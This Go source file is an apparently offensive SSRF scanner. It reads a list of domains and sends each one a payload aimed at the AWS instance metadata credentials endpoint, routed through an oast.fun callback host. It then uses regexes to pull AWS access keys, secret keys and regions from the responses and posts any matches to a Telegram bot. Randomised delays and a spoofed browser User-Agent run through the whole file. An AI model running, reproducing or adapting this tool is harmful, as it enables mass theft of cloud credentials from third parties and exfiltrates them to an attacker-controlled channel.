package main

import (
	"bufio"
	"fmt"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strings"
	"sync"
	"time"

	"github.com/valyala/fasthttp"
)

const maxWorkers = 1
const batchSize = 1
const delayBetweenRequests = 500
const delayBetweenBatches = 500

var httpClient = &fasthttp.Client{
	MaxConnsPerHost: 5,
	ReadTimeout:     10 * time.Second,
	WriteTimeout:    10 * time.Second,
}

var (
	urlCounter   int
	totalUrls    int
	totalIPs     int
	counterMutex sync.Mutex
)

var ipRegex = regexp.MustCompile(`^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$`)

var awsMetadataPayloads = []string{
	"/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/",
}

const (
	TELEGRAM_TOKEN = ""
	CHAT_ID        = ""
)

func sendTelegramMessage(message string) {
	apiURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", TELEGRAM_TOKEN)
	data := url.Values{}
	data.Set("chat_id", CHAT_ID)
	data.Set("text", message)

	_, err := http.PostForm(apiURL, data)
	if err != nil {
		fmt.Println("Error sending message:", err.Error())
	}
}

func exploitMetadata(url string, payloads []string, interactshServer string, wg *sync.WaitGroup, sem chan struct{}) {
	defer wg.Done() 

	sem <- struct{}{}
	defer func() { <-sem }()

	if !strings.HasPrefix(url, "http://") && !strings.HasPrefix(url, "https://") {
		url = "https://" + url
	}

	for _, payload := range payloads {
		fullurl := url + payload
		interactshPayload := fmt.Sprintf("%s?url=%s", interactshServer, fullurl) 
		fmt.Printf("[⚙️] Envoi de la requête vers les métadonnées pour l'URL: %s\n", interactshPayload)

		req := fasthttp.AcquireRequest()
		resp := fasthttp.AcquireResponse()
		defer fasthttp.ReleaseRequest(req)
		defer fasthttp.ReleaseResponse(resp)

		req.SetRequestURI(interactshPayload) 
		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")

		err := httpClient.DoTimeout(req, resp, 10*time.Second)
		if err != nil {
			fmt.Println("[❌] Erreur d'accès aux métadonnées:", err)
			continue
		}

		if resp.StatusCode() == 200 {
			body := string(resp.Body())
			fmt.Printf("[🟢] Informations de métadonnées reçues pour %s: %s\n", url, body)

			accessKeyRegex := `AKIA[A-Z0-9]{16}`
			secretKeyRegex := `(?:AWS|aws|ACCESS|access|SECRET|secret)[\s=:]+([0-9a-zA-Z/+]{40})`
			regionRegex := `(?:us-(?:east|west)-\d|ap-(?:northeast|southeast|south)-\d|ca-central-\d|eu-(?:central|west|north)-\d|sa-east-\d|af-south-\d|me-south-\d)`

			re := regexp.MustCompile(accessKeyRegex)
			accessKeyMatches := re.FindStringSubmatch(body)
			re = regexp.MustCompile(secretKeyRegex)
			secretKeyMatches := re.FindStringSubmatch(body)
			re = regexp.MustCompile(regionRegex)
			regionMatches := re.FindStringSubmatch(body)
			if len(accessKeyMatches) > 0 && len(secretKeyMatches) > 0 && len(regionMatches) > 0 {
				message := fmt.Sprintf("[🟢] AWS FOUND [🟢]\n\nAKIA: %v\nSecretKey: %v\nRegion: %v", accessKeyMatches[0], secretKeyMatches[0], regionMatches[0])
				sendTelegramMessage(message)
			} else {
				fmt.Println("[❌] AWS NOT FOUND")
			}
		} else {
			fmt.Printf("[❌] Pas d'accès aux métadonnées pour le payload %s, statut: %d\n", payload, resp.StatusCode())
		}

		time.Sleep(time.Duration(delayBetweenRequests+rand.Intn(500)) * time.Millisecond)
	}
}

// Main function
func main() {
	var wg sync.WaitGroup

	sem := make(chan struct{}, maxWorkers)

	file, err := os.Open("domain.txt")
	if err != nil {
		fmt.Println("Erreur lors de l'ouverture du fichier:", err)
		return
	}
	defer file.Close()

	var urls []string
	scanner := bufio.NewScanner(file)

	for scanner.Scan() {
		url := scanner.Text()
		if strings.TrimSpace(url) != "" {
			urls = append(urls, url)
		}
	}

	if err := scanner.Err(); err != nil {
		fmt.Println("Erreur de lecture du fichier:", err)
	}

	for i := 0; i < len(urls); i += batchSize {
		batchEnd := i + batchSize
		if batchEnd > len(urls) {
			batchEnd = len(urls)
		}

		batch := urls[i:batchEnd]
		fmt.Printf("[⚙️] Traitement du lot %d à %d de %d URLs...\n", i+1, batchEnd, len(urls))

		for _, url := range batch {
			wg.Add(1)
			go exploitMetadata(url, awsMetadataPayloads, "http://okjdvhejasbottxyrqnp8tvsdeqx12aso.oast.fun", &wg, sem)
		}

		wg.Wait()

		time.Sleep(time.Duration(delayBetweenBatches+rand.Intn(500)) * time.Millisecond)
	}

	fmt.Println("[✅] Traitement terminé.")
}